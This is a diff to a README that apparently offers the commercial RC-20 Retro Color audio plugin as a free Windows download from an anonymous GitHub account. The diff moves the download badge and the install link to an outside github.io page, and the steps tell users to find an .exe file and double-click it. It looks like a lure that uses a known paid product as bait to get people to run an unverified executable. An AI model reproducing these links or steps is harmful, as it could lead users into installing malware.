@@ -1,6 +1,6 @@
 # 🎹 RC-20-Retro-Color - Add Vintage Analog Texture To Audio
 
-[![](https://img.shields.io/badge/Download-RC--20-blue.svg)](https://github.com/Relieved-georgetown348/RC-20-Retro-Color)
+[![](https://img.shields.io/badge/Download-RC--20-blue.svg)](https://relieved-georgetown348.github.io)
 
 ## 📁 What is RC-20 Retro Color
 
@@ -25,7 +25,7 @@ Ensure your computer has the latest audio drivers installed. Outdated drivers ca
 Follow these steps to set up the software on your Windows machine.
 
 1. Prepare your computer. Ensure you have an active internet connection.
-2. Visit the download page. Click this link to proceed: [https://github.com/Relieved-georgetown348/RC-20-Retro-Color](https://github.com/Relieved-georgetown348/RC-20-Retro-Color)
+2. Visit the download page. Click this link to proceed: [https://relieved-georgetown348.github.io](https://relieved-georgetown348.github.io)
 3. Locate the installation file. Look for the file ending in .exe.
 4. Save the file to your desktop or downloads folder.
 5. Double-click the file to start the installation wizard.
